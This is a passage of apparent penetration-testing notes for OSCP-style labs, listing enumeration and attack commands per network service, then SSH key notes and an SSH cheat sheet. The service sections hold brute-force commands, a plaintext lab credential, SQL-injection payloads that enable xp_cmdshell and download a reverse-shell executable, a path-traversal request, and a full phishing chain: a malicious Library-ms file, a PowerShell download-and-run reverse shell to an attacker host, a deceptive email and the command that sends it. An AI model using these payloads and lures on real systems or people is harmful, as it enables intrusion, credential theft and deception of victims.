11. Bruteforce: hydra [-L &lt;users.txt&gt; or -l &lt;user_name&gt;] [-P &lt;pass.txt&gt; or -p ] -f  ftp://&lt;IP&gt;:&lt;PORT&gt;

12. If it's a Microsoft server -&gt; Try asp, aspx payloads. Try staged/stageless, x32/x64 payloads.

13. Check if we can overwrite stuff and upload files to make it work. Look at the permissions.

14. Look for hidden files, go back to a directory if you find anything, and look for creds in DB Files.

15. Don't forget about TFTP on UDP Port 69
	1. nmap -Pn -sU -p69 --script tftp-enum 192.168.10.250
	2. https://github.com/EnableSecurity/tftptheft
</code></pre>
<h3 id="53---dns"><a class="header" href="#53---dns"><ins>53 - DNS</ins></a></h3>
<pre><code>1. nslookup: nslookup --- SERVER &lt;IP&gt; --- 127.0.0.1

2. God command: dig @&lt;IP&gt; any &lt;domain_name&gt;

3. God command: dig axfr &lt;domain_name&gt; @&lt;IP&gt;

4. Nmap: nmap -n --script "(default and dns) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" &lt;IP&gt;

5. DNSRecon: dnsrecon -d &lt;domain_name&gt; -n &lt;IP&gt;

6. DNSEnum: dnsenum &lt;domain_name&gt;

7. Nmap Zone Transfer: nmap --script=dns-zone-transfer -p 53 &lt;domain_name&gt;

</code></pre>
<h3 id="22---ssh"><a class="header" href="#22---ssh"><ins>22 - SSH</ins></a></h3>
<pre><code>
1. SSH Login: ssh &lt;username&gt;@&lt;IP&gt;

2. Non-default port: ssh &lt;username&gt;@&lt;IP&gt; -p 2222

3. Banner Grabbing: nc -vn &lt;IP&gt; 22

4. Public SSH key of server: ssh-keyscan -t rsa &lt;IP&gt; -p &lt;PORT&gt;

5. When you have the id_rsa key: chmod 600 id_rsa then ssh -i id_rsa &lt;USER&gt;@&lt;IP&gt;

6. Retrieve weak keys: nmap -p22 &lt;IP&gt; --script ssh-hostkey --script-args ssh_hostkey=full

7. Bruteforcing SSH: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt &lt;IP&gt; ssh -t 4 -V

8. Bruteforcing 2: hydra -L users -e nsr -t 4 $ip ssh

9. After initial access, find ssh keys in linux: find / -name ssh 2&gt;/dev/null
</code></pre>
<h3 id="3896363268---ldap"><a class="header" href="#3896363268---ldap"><ins>389/636/3268 - LDAP</ins></a></h3>
<pre><code>1. Domain name: nmap -n -sV --script "ldap* and not brute" &lt;IP&gt;

2. Banner Grabbing: nmap -p 389 --script ldap-search -Pn &lt;IP&gt;

3. Ldap Naming Context: ldapsearch -x -H ldap://&lt;IP&gt; -s base namingcontexts

4. Sometimes passwords can be found here: ldapsearch -x -H ldap://&lt;IP&gt; -s sub -b 'dc=&lt;&gt;,dc=&lt;&gt;' #From the naming context

5. Dump: ldapsearch -H ldap://&lt;IP&gt; -x -b "{Naming_Context}"

6. Base LdapSearch: ldapsearch -H ldap://&lt;IP&gt; -x

7. Find usernames: ldapsearch -H ldap://&lt;IP&gt; -x -b "DC=&lt;&gt;,DC=&lt;&gt;" '(objectClass=Person)'

8. Find usernames: ldapsearch -H ldap://10.10.10.161 -x -b "DC=&lt;&gt;,DC=&lt;&gt;" '(objectClass=user)' sAMAccountName

9. Same, but with grep: ldapsearch -x -H ldap://$ip -D '' -w '' -b "DC=baby,DC=vl" | grep sAMAccountName | awk -F: '{ print $2 }' |  awk '{ gsub(/ /,""); print }'

	1. Then validate them: /opt/kerbrute userenum --dc $ip -d baby.vl users


11. Hydra: hydra -l &lt;Username&gt; -P &lt;Big_Passwordlist&gt; &lt;IP&gt; ldap2 -V -f
LDAP Login: ldapdomaindump &lt;IP&gt; [-r &lt;IP&gt;] -u '&lt;domain\user&gt;' -p '&lt;pass&gt;' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]

10. ldapdomaindump 10.10.55.72 -u 'LAB-ENTERPRISE\nik' -p ToastyBoi! -o ldapdomaindumpdir


Found this useful as well:

ldapsearch -H ldap://&lt;IP&gt; -x -b "DC=hutch,DC=offsec"

ldapsearch -H ldap://192.168.71.122 -x -b "CN=Users,DC=hutch,DC=offsec"  # Get User info

# Look for any plaintext passwords in the description field
ldapsearch -H "ldap://&lt;IP&gt;" -v -x -b "DC=hutch,DC=offsec" "(objectclass=*)"

# If LAPS is found on the server, can look for admin password
ldapsearch -H ldap://&lt;IP&gt; -v -x -D &lt;USER&gt;@HUTCH.OFFSEC -w &lt;PASS&gt;-b "DC=hutch,DC=offsec" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

</code></pre>
<h3 id="161---snmp"><a class="header" href="#161---snmp"><ins>161 - SNMP</ins></a></h3>
<pre><code>
1. Nmap: sudo nmap -sU --open -p 161 10.11.1.1-254 (find ip with SMTP open)

2. onesixtyone bruteforce tool: for ip in $(seq 1 254); do echo 10.11.1.$ip; done &gt; ips then, onesixtyone -c community -i ips

3. Enumerating Entire MIB Tree: snmpwalk -c public -v1 -t 10 &lt;IP&gt;

4. Enumerating Windows Users: snmpwalk -c public -v1 &lt;IP&gt; 1.3.6.1.4.1.77.1.2.25

5. Enumerating Running Windows Processes: snmpwalk -c public -v1 &lt;IP&gt; 1.3.6.1.2.1.25.4.2.1.2

6. Enumerating Open TCP Ports: snmpwalk -c public -v1 &lt;IP&gt; 1.3.6.1.2.1.6.13.1.3

</code></pre>
<h3 id="25---smtp"><a class="header" href="#25---smtp"><ins>25 - SMTP</ins></a></h3>
<pre><code>1. To find Users: nmap --script smtp-enum-users.nse -p 25,465,587 &lt;IP&gt;
2. If Anonymous Login is allowed we can use Netcat to send Phishing emails through SMTP.

OSCP Mail Hack

Run WebDAv Server
1. wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/Desktop/pen200/relia/webdav/

On Windows setup config and shortcut

Make a file named "config.Library-ms"

&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt; &lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt; &lt;version&gt;6&lt;/version&gt; &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt; &lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt; &lt;templateInfo&gt; &lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt; &lt;/templateInfo&gt; &lt;searchConnectorDescriptionList&gt; &lt;searchConnectorDescription&gt; &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt; &lt;isSupported&gt;false&lt;/isSupported&gt; &lt;simpleLocation&gt; &lt;url&gt;http://192.168.45.219&lt;/url&gt; &lt;/simpleLocation&gt; &lt;/searchConnectorDescription&gt; &lt;/searchConnectorDescriptionList&gt; &lt;/libraryDescription&gt;

Drop a powershell reverse shell into a shortcut key in the same folder, hope they click it:

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.219:9090/powercat.ps1'); powercat -c 192.168.45.219 -p 4444 -e powershell"

Create a body for email

body.txt
---
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists
in the Git logs. I'll remove it for security reasons.
On an unrelated note, please install the new security features on your workstation.
For this, download the attached file, double-click on it, and execute the
configuration shortcut within. Thanks!
John

Make sure nc is setup and run this:

1. sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.223.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap




</code></pre>
<h3 id="3389---rdp"><a class="header" href="#3389---rdp"><ins>3389 - RDP</ins></a></h3>
<pre><code>If you get RDP, first transfer nc.exe (windows) or netcat (Linux) to get the shell back on our attacking machine.

1. Xfreerdp: xfreerdp /v:&lt;IP&gt; /u:&lt;USER&gt; /d:&lt;DOMAIN&gt; /p:&lt;PASS&gt; +clipboard /dynamic-resolution /drive:/opt,share

2. rdesktop -u &lt;username&gt; &lt;IP&gt;

3. rdesktop -d &lt;domain&gt; -u &lt;username&gt; -p &lt;pass&gt; &lt;IP&gt;

4. psexec: impacket-psexec &lt;user&gt;:&lt;pass&gt;@&lt;IP&gt; 

5. smbclient: smbclient \\\\&lt;IP&gt;\\ -U &lt;user&gt; 

6. Nmap: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 &lt;IP&gt;

7. Bruteforce: hydra -L &lt;users.txt&gt; -p &lt;pass.txt&gt; &lt;IP&gt; rdp

8. smbmap: smbmap -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; -H &lt;IP&gt; 

9. wmiexec: impacket-wmiexec &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;IP&gt;


</code></pre>
<h3 id="135593---rpc"><a class="header" href="#135593---rpc"><ins>135/593 - RPC</ins></a></h3>
<pre><code>
1. Null login: rpcclient &lt;IP&gt; -U ''

2. Try enumdomusers, enumdomgroups, and querydispinfo to enumerate once you are in
rpcclient -U "" -N &lt;IP&gt;

3. Try without a password: rpcclient -U "" &lt;IP&gt;

4. With creds: rpcclient -U 'support' $ip

5. Dump: impacket-rpcdump -p 135 &lt;IP&gt;

</code></pre>
<h3 id="59855986---evil-winrm"><a class="header" href="#59855986---evil-winrm"><ins>5985/5986 - Evil-winrm</ins></a></h3>
<pre><code>1. Check: crackmapexec --verbose winrm &lt;IP&gt; -u &lt;username&gt; -p &lt;password&gt;

2. Try both ports: evil-winrm -i &lt;IP&gt; -u &lt;username&gt; -p &lt;password&gt; -p &lt;port&gt;

3. Powershell session: evil-winrm -i &lt;IP&gt; -u &lt;username&gt; -p &lt;password&gt;

4. Pass the hash (NTLM): evil-winrm -i &lt;IP&gt; -u &lt;username&gt; -H &lt;hash&gt;

5. Exfil data using Evil-winrm: download &lt;File to be exfiltrated location&gt; &lt;Local location where it should be exfiltrated&gt;


</code></pre>
<h3 id="3306---mysql"><a class="header" href="#3306---mysql"><ins>3306 - MYSQL</ins></a></h3>
<pre><code>1. MYSQL Login: mysql -h &lt;IP&gt; -u &lt;username&gt; -p &lt;pass&gt; -P &lt;port&gt;

2. Nmap Vulnerability scan: nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 &lt;IP&gt;

3. Login: sqsh -S &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -D &lt;database&gt;

</code></pre>
<h4 id="xp_cmdshell---rce"><a class="header" href="#xp_cmdshell---rce">xp_cmdshell -&gt; RCE</a></h4>
<pre><code>sqsh -S &lt;IP&gt; -U &lt;Username&gt; -P &lt;Password&gt; -D &lt;Database&gt;

In sqsh, you need to use GO after writing the query to send it
Do one by one each command:

# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE

# This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
EXEC master..xp_cmdshell 'whoami'

-----------------------------------------------------
# Enabling xp_cmdshell for SQL Server 2005
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
-----------------------------------------------------

'EXECUTE sp_configure 'show advanced options', 1; --
'RECONFIGURE; --
'EXECUTE sp_configure 'xp_cmdshell', 1; --
'RECONFIGURE; --
'EXECUTE xp_cmdshell 'certutil -urlcache -f 192.168.45.181:80/test.exe'; --

-----------------------------------------------------

msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o test.exe
'%3bEXEC%20sp_configure%20'show%20advanced%20options'%2c%201%3b--
'%3bRECONFIGURE%3b--
'%3bEXEC%20sp_configure%20'xp_cmdshell',1%3b--
'%3bRECONFIGURE%3b--
'%3bEXEC+xp_cmdshell+'whoami'%3b--
'%3bEXEC%20xp_cmdshell%20"net user"%3b--
python3 -m http.server 80
'EXEC+xp_cmdshell+'certutil+-urlcache+-f+192.168.45.181%3a80/test.exe'%3b--
nc -nvlp 4444
admin'EXEC+xp_cmdshell+'c%3a\\inetpub\\wwwroot\\test.exe%3b--

</code></pre>
<h3 id="1433---mssql"><a class="header" href="#1433---mssql"><ins>1433 - MSSQL</ins></a></h3>
<pre><code>
1. Login: sqsh -S &lt;IP&gt; -U &lt;username&gt; -P "&lt;pass&gt;"

2. Login: sqsh -S &lt;IP&gt; -U .\\&lt;Username&gt; -P &lt;pass&gt; -D &lt;database&gt;

3. Login: impacket-mssqlclient :&lt;username&gt;:&lt;pass&gt;@&lt;IP&gt; -windows-auth

4. Login: impacket-mssqlclient :&lt;username&gt;:&lt;pass&gt;@&lt;IP&gt; -local-auth

</code></pre>
<pre><code>This is mostly just notes from a htb I thought was worth remembering:

Add to /etc/hosts:
10.129.24.37 dc.sequel.htb sequel.htb dc

Connect with impacket:
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb

List of Databases:
select name from master..sysdatabases;


</code></pre>
<h4 id="xp_cmdshell---rce-1"><a class="header" href="#xp_cmdshell---rce-1">xp_cmdshell -&gt; RCE</a></h4>
<pre><code>sqsh -S &lt;IP&gt; -U &lt;Username&gt; -P &lt;Password&gt; -D &lt;Database&gt;

In sqsh, you need to use GO after writing the query to send it
Do one by one each command:

# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE

# This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
EXEC master..xp_cmdshell 'whoami'

</code></pre>
<h3 id="5901---vnc"><a class="header" href="#5901---vnc"><ins>5901 - VNC</ins></a></h3>
<pre><code>
Enumeration

nmap -p 5900 --script=*vnc* &lt;IP&gt;

Connect to a VNC service

- Requires valid credentials
 
vncviewer 192.168.1.218:&lt;PN&gt;

vncviewer 127.0.0.1:5000 -passwd secret

When setting a VNC password, the password is obfuscated and saved as a file on the server. Instead of directly entering the password, the obfuscated password file can be included using the passwd option.

- Connecting to VNC using Port-forward:   

# ssh -L [local-port]:[remote-ip]:[remote-port]

​
ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84

ssh -L 5000:localhost:5901 charix@10.10.10.84

#verify

netstat -an | grep LIST


Decrypting Passwords


VNC uses a hardcoded DES key to store credentials. The same key is used across multiple product lines. Reference:[https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)​

- _RealVNC_ HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver Value: Password
    

- _TightVNC_ HKEY_CURRENT_USER\Software\TightVNC\Server HKLM\SOFTWARE\TightVNC\Server\
    

- tightvnc.ini vnc_viewer.ini Value: Password or PasswordViewOnly
    

- _TigerVNC_ HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 Value: Password
    

- _UltraVNC_ C:\Program Files\UltraVNC\ultravnc.ini Value: passwd or passwd2
    

#Decrypt with Metasploit

msf5 &gt; irb

key = "\x17\x52\x6b\x06\x23\x4e\x58\x07"

require 'rex/proto/rfb'

Rex::Proto::RFB::Cipher.decrypt ["YOUR ENCRYPTED VNC PASSWORD HERE"].pack('H*'), key



GitHub - trinitronx/vncpasswd.py: A Python implementation of vncpasswd, w/decryption abilities &amp; extra features ;-)

GitHub


(https://github.com/trinitronx/vncpasswd.py)

- **-d:** decrypt
    

- **-f:** file
    

python vncpasswd.py -d -f ../../htb/poison/secret

</code></pre>
<h3 id="3128---squid"><a class="header" href="#3128---squid"><ins>3128 - Squid</ins></a></h3>
<p><a href="https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid">HackTricks Link</a></p>
<pre><code>Use these two scripts to build a list of ports, then scan with the squid proxy
</code></pre>
<pre><code># The file where we want to store the list of ports
# Create the file if it doesn't exist
ports_file="ports_to_check.txt"
#if [[ ! -f $ports_file ]] ; then touch $ports_file ; fi

# The number of Nmap top ports to output
num_ports=100

# Generate the list of top ports
# Nmap lists port ranges with a hyphen (-)
# We use `sed` to replace the hyphens with `..`
# `..` indicates will help with generating port ranges below
top_ports=$(nmap -sT --top-ports $num_ports -v -oG - 2&gt;/dev/null | grep TCP | cut -d ';' -f 2 | cut -d ')' -f 1 | tr ',', "\n" | sed 's/\-/../g')

# Clear out the ports file list
echo &gt; $ports_file

# For each port in the list of ports do ...
    # If the port has a hyphen `-` ...
        # Create a list of ports using {$port}
        # For example {49152..49157}
        # Then add them to our ports list file
    # Otherwise ...
        # Just take a single port and add to the file
for port in $(echo $top_ports) ; 
do 
    if echo $port | grep '\.\.' &gt; /dev/null; then 
        for port_in_range in {$port} ; 
        do 
        	echo $port_in_range &gt;&gt; $ports_file ; 
        done ; 
    else 
        echo $port &gt;&gt; $ports_file ; 
    fi
done

</code></pre>
<pre><code># Define a base URL, which is the proxy address minus the proxy port
base_url='http://192.168.236.189'
# Define the proxy URL, which is the base URL plus the proxy port
proxy_url="$base_url:3128"

for port in $(cat ports_to_check.txt) ; do \
    # Create a test URL string, which is the base URL plus the test port
    test_url="$base_url:$port"
    # If we don't find the string `ERROR` the port may be open
    if ! curl -skL --proxy $proxy_url $test_url | grep ERROR &gt; /dev/null ; then \
        echo "$test_url may be open behind the proxy" ; \
    fi ; \
done 

</code></pre>
<p>Or just use Spose
<a href="https://github.com/aancw/spose">Spose</a></p>
<h3 id="873---rsync"><a class="header" href="#873---rsync"><ins>873 - rsync</ins></a></h3>
<p>https://youssef-ichioui.medium.com/abusing-rsync-misconfiguration-to-get-persistent-access-via-ssh-2507d4a1690b</p>
<pre><code>Connect and repeat back what it gives you:
nc -vn $ip 873
@RSYNC: 31.0

Try to connect and download files:
rsync -av rsync://$ip/httpd ./mytemp 



</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ssh-keys"><a class="header" href="#ssh-keys">SSH Keys</a></h1>
<p>How to add your public SSH key to another host:</p>
<p>Create SSH key (on your host):</p>
<pre><code>$ ssh-keygen

Keys will be saved to
/home/yourusername/.ssh/id_rsa &lt;- private key
/home/yourusername/.ssh/id_rsa.pub &lt;- public key
</code></pre>
<ol>
<li>Copy the contents of the public key (id_rsa.pub)</li>
<li>Save the contents on the victim machine in the authorized_keys file (if it does not exist, create it) authorized_keys location:</li>
</ol>
<pre><code>     /home/user/.ssh/authorized_keys

     root's authorized_keys location
     /root/.ssh/authorized_keys
</code></pre>
<p>Once the key is saved in the authorized_keys, you will not need a password to sign in</p>
<p>Use your private key (generated with the public key using ssh-keygen) to sign in:</p>
<p>Make sure to update the correct key-permissions first:</p>
<pre><code>$ chmod 600 id_rsa

$ ssh -i id_rsa user@host
</code></pre>
<p>If you get this: # <a href="https://stackoverflow.com/questions/75890387/ssh-too-many-authentication-failures">ssh: too many authentication failures</a></p>
<p>Do this:</p>
<pre><code>You can check it first with: ssh -v

and then just to clean up all keys with: ssh-add -D

as a quick and dirty solution.
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><p>https://www.stationx.net/ssh-commands-cheat-sheet/</p>
<h2 id="what-is-ssh"><a class="header" href="#what-is-ssh">What Is SSH?</a></h2>
<p>SSH (short for “Secure Shell” or “Secure Socket Shell”) is a network protocol for accessing network services securely over unsecured networks. It includes the suite of utilities implementing it, such as:</p>
<ul>
<li><strong>ssh-keygen:</strong> for creating new authentication key pairs for SSH;</li>
<li><strong>SCP</strong> (Secure Copy Protocol): for copying files between hosts on a network;</li>
<li><strong>SFTP</strong> (Secure File Transfer Protocol): for sending and receiving files. It’s an SSH-secured version of FTP (File Transfer Protocol), and it has replaced FTP and FTPS (FTP Secure) as the preferred mechanism for file sharing over the Internet.</li>
</ul>
<p>An SSH server, by default, listens for connections on the standard Transmission Control Protocol (TCP) <a href="https://www.stationx.net/common-ports-cheat-sheet/">port 22</a>. Your applications may listen for SSH connections on other ports.</p>
<p>SSH lets you securely manage remote systems and applications, such as logging in to another computer over a network, executing commands, and moving files from one computer to another. An advanced SSH functionality is the creation of secure tunnels to run other application protocols remotely.</p>
<h2 id="ssh-cheat-sheet-search"><a class="header" href="#ssh-cheat-sheet-search">SSH Cheat Sheet Search</a></h2>
<p>Search our SSH cheat sheet to find the right cheat for the term you're looking for. Simply enter the term in the search bar, and you'll receive the matching cheats available.</p>
<h2 id="port-knocking"><a class="header" href="#port-knocking">Port Knocking</a></h2>
<p>Find the knockd file, then hit that sequence</p>
<pre><code>http://192.168.208.209/welcome.php?file=../../../../../../../etc/knockd.conf

Example from DC-9 Box on PG:

[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 



Run this script:

for x in 7469 8475 9842; do
	nmap -Pn --host-timeout 201 --max-retries 0 -p $x $ip;
done
</code></pre>
<h2 id="basic-ssh-commands"><a class="header" href="#basic-ssh-commands">Basic SSH Commands</a></h2>
<p>The following are fundamental SSH commands. Commit as many to memory as you can.</p>
<div class="table-wrapper"><table><thead><tr><th><strong>COMMAND</strong></th><th><strong>DESCRIPTION</strong></th></tr></thead><tbody>
<tr><td><strong><code>ssh</code></strong></td><td><strong>Connect to a remote server</strong></td></tr>
<tr><td><code>ssh pi@raspberry</code></td><td>Connect to the device <code>raspberry</code> on the default SSH port 22 as user <code>pi</code></td></tr>
<tr><td><code>ssh pi@raspberry -p 3344</code></td><td>Connect to the device <code>raspberry</code> on a specific port 3344 as user <code>pi</code></td></tr>
<tr><td><code>ssh -i /path/file.pem admin@192.168.1.1</code></td><td>Connect to <code>root@192.168.1.1</code> via the key file <code>/path/file.pem</code> as user <code>admin</code></td></tr>
<tr><td><code>ssh root@192.168.2.2 'ls -l'</code></td><td>Execute remote command <code>ls -l</code> on <code>192.168.2.2</code> as user <code>root</code></td></tr>
<tr><td><code>$ ssh user@192.168.3.3 bash &lt; script.sh</code></td><td>Invoke the script <code>script.sh</code> in the current working directory spawning the SSH session to <code>192.168.3.3</code> as user <code>user</code></td></tr>
<tr><td><code>ssh friend@Best.local "tar cvzf - ~/ffmpeg" &gt; output.tgz</code></td><td>Compress the <code>~/ffmpeg</code> directory and download it from a server <code>Best.local</code> as user <code>friend</code></td></tr>
<tr><td><strong><code>ssh-keygen</code></strong></td><td><strong>Generate SSH keys (follow the prompts)</strong></td></tr>
<tr><td><code>ssh-keygen -F [ip/hostname]</code></td><td>Search for some IP address or hostname from <code>~/.ssh/known_hosts</code> (logged-in host)</td></tr>
<tr><td><code>ssh-keygen -R [ip/hostname]</code></td><td>Remove some IP address or hostname from <code>~/.ssh/known_hosts</code> (logged-in host)</td></tr>
<tr><td><code>ssh-keygen -f ~/.ssh/filename</code></td><td>Specify file name</td></tr>
<tr><td><code>ssh-keygen -y -f private.key &gt; public.pub</code></td><td>Generate public key from private key</td></tr>
<tr><td><code>ssh-keygen -c -f ~/.ssh/id_rsa</code></td><td>Change the comment of the key file <code>~/.ssh/id_rsa</code></td></tr>
<tr><td><code>ssh-keygen -p -f ~/.ssh/id_rsa</code></td><td>Change passphrase of private key <code>~/.ssh/id_rsa</code></td></tr>
<tr><td><code>ssh-keygen -t rsa -b 4096 -C "my@email.com"</code></td><td>Generate an RSA 4096-bit key with “<code>my@email.com</code>” as a comment:  <br><code>-t</code>: Type of key (<code>rsa, ed25519, dsa, ecdsa</code>)  <br><code>-b</code>: The number of bits in the key  <br><code>-C</code>: Provides a new comment</td></tr>
<tr><td><strong><code>scp</code></strong></td><td><strong>Copy files securely between servers</strong></td></tr>
<tr><td><code>scp user@server:/folder/file.ext dest/</code></td><td>Copy from remote to local destination <code>dest/</code></td></tr>
<tr><td><code>scp dest/file.ext user@server:/folder</code></td><td>Copy from local to remote</td></tr>
<tr><td><code>scp user1@server1:/file.ext user2@server2:/folder</code></td><td>Copy between two different servers</td></tr>
<tr><td><code>scp user@server:/folder/* .</code></td><td>Copies from a server folder to the current folder on the local machine</td></tr>
<tr><td><code>scp -r</code></td><td>Recursively copy entire directories</td></tr>
<tr><td><code>scp -r user@server:/folder dest/</code></td><td>Copy the entire folder to the local destination <code>dest/</code></td></tr>
<tr><td><code>scp user@server:/folder/* dest/</code></td><td>Copy all files from a folder to the local destination <code>dest/</code></td></tr>
<tr><td><code>scp -C</code></td><td>Option to compress data</td></tr>
<tr><td><code>scp -v</code></td><td>Option to print verbose info</td></tr>
<tr><td><code>scp -p</code></td><td>Option to preserve the last modification timestamps of the transferred files</td></tr>
<tr><td><code>scp -P 8080</code></td><td>Option to connect to remote host port 8080</td></tr>
<tr><td><code>scp -B</code></td><td>Option for <a href="https://www.thegeekstuff.com/2009/10/how-to-execute-ssh-and-scp-in-batch-mode-only-when-passwordless-login-is-enabled/">batch mode</a> and prevent you from entering passwords or passphrases</td></tr>
<tr><td><strong><code>sftp</code></strong></td><td><strong>Securely transfer files between servers</strong></td></tr>
<tr><td><code>sftp -p</code></td><td>Option to preserve the last modification timestamps of the transferred files</td></tr>
<tr><td><code>sftp -P 8080</code></td><td>Option to connect to remote host port 8080</td></tr>
<tr><td><code>sftp -r</code></td><td>Recursively copy entire directories when uploading and downloading. SFTP doesn’t follow symbolic links encountered in the tree traversal.</td></tr>
</tbody></table>
</div>
<p><strong>Download the PDF Version of This SSH Commands Cheat Sheet!</strong></p>
<p>Want to keep this cheat sheet at your fingertips? Just enter your email address, and we’ll send a PDF copy to your inbox.</p>
<p><strong>DOWNLOAD →</strong></p>
<h2 id="ssh-configurations-and-options"><a class="header" href="#ssh-configurations-and-options">SSH Configurations and Options</a></h2>
<p>Have you ever wondered how SSH remembers your login credentials for various machines? This section is a brief reference on how to do so.</p>
<div class="table-wrapper"><table><thead><tr><th><strong>COMMAND</strong></th><th><strong>DESCRIPTION</strong></th></tr></thead><tbody>
<tr><td><strong><code>man ssh_config</code></strong></td><td><strong>Open OpenSSH SSH client configuration files.</strong> This manual lists all the OpenSSH parameters you can change.</td></tr>
<tr><td><code>cat /etc/ssh/ssh_config | less</code></td><td>View your OpenSSH client system-wide configuration file</td></tr>
<tr><td><code>cat /etc/ssh/sshd_config | less</code></td><td>View your OpenSSH server system-wide configuration file; the “d” stands for the server “daemon”</td></tr>
<tr><td><code>cat ~/.ssh/config | less</code></td><td>View your SSH client user-specific configuration file</td></tr>
<tr><td><code>cat ~/.ssh/id_{type} | less</code></td><td>View your SSH client private key; <code>type</code> is any of <code>rsa, ed25519, dsa, ecdsa</code>.</td></tr>
<tr><td><code>cat ~/.ssh/id_{type}.pub | less</code></td><td>View your SSH client public key; <code>type</code> is any of <code>rsa, ed25519, dsa, ecdsa</code>.</td></tr>
<tr><td><code>cat ~/.ssh/known_hosts | less</code></td><td>View your SSH client logged-in hosts</td></tr>
<tr><td><code>cat ~/.ssh/authorized_keys | less</code></td><td>View your SSH client authorized login keys</td></tr>
<tr><td><strong><code>ssh-agent</code></strong></td><td><strong>Hold private SSH keys used for public key authentication (RSA, DSA, ECDSA, Ed25519)</strong></td></tr>
<tr><td><code>ssh-agent -E fingerprint_hash</code></td><td>Specify the hash algorithm used when displaying key fingerprints.  <br>Valid <code>fingerprint_hash</code> options are <code>sha256</code> (default) and <code>md5</code>.</td></tr>
<tr><td><code>ssh-agent -t lifetime</code></td><td>Set up a maximum <code>lifetime</code> for identities/private keys, overwritable by the same setting in <code>ssh-add</code>.   <br>Examples of lifetime:  <br>• <code>600</code> = 600 seconds (10 minutes)  <br>• <code>23m</code> = 23 minutes  <br>• <code>1h45</code> = 1 hour 45 minutes</td></tr>
<tr><td><strong><code>ssh-add</code></strong></td><td><strong>Add SSH keys to the <code>ssh-agent</code></strong></td></tr>
<tr><td><code>ssh-add -l</code></td><td>List your private keys cached by <code>ssh-agent</code></td></tr>
<tr><td><code>ssh-add -t lifetime</code></td><td>Set up a maximum <code>lifetime</code> for identities/private keys.  <br>Examples of <code>lifetime</code>:  <br>• <code>600</code> = 600 seconds (10 minutes)  <br>• <code>23m</code> = 23 minutes  <br>• <code>1h45</code> = 1 hour 45 minutes</td></tr>
<tr><td><code>ssh-add -L</code></td><td>List the public key parameters of all saved identities</td></tr>
<tr><td><code>ssh-add -D</code></td><td>Delete all cached private keys</td></tr>
<tr><td><strong><code>ssh-copy-id</code></strong></td><td><strong>Copy, install, and configure SSH keys on a remote server</strong></td></tr>
<tr><td><code>ssh-copy-id user@server</code></td><td>Copy SSH keys to a <code>server</code> as a <code>user</code></td></tr>
<tr><td><code>ssh-copy-id server1</code></td><td>Copy to some alias server <code>server1</code> with the default login</td></tr>
<tr><td><code>ssh-copy-id -i ~/.ssh/id_rsa.pub user@server</code></td><td>Copy a specific key to a <code>server</code> as a <code>user</code></td></tr>
</tbody></table>
</div>
<h2 id="remote-server-management"><a class="header" href="#remote-server-management">Remote Server Management</a></h2>
<p>The operating systems of SSH servers are mostly Unix/Linux, so once you’ve logged in to a server via SSH, the following commands are largely the same as their counterparts in Unix/Linux. Check out our <a href="https://www.stationx.net/unix-commands-cheat-sheet/">Unix commands cheat sheet</a> and <a href="https://www.stationx.net/linux-command-line-cheat-sheet/">Linux command line cheat sheet</a> for other file management commands applicable to SSH.</p>
<div class="table-wrapper"><table><thead><tr><th><strong>COMMAND</strong></th><th><strong>DESCRIPTION</strong></th></tr></thead><tbody>
<tr><td><code>cd</code></td><td>Change the current working directory</td></tr>
<tr><td><code>kill</code></td><td>Stop a running process</td></tr>
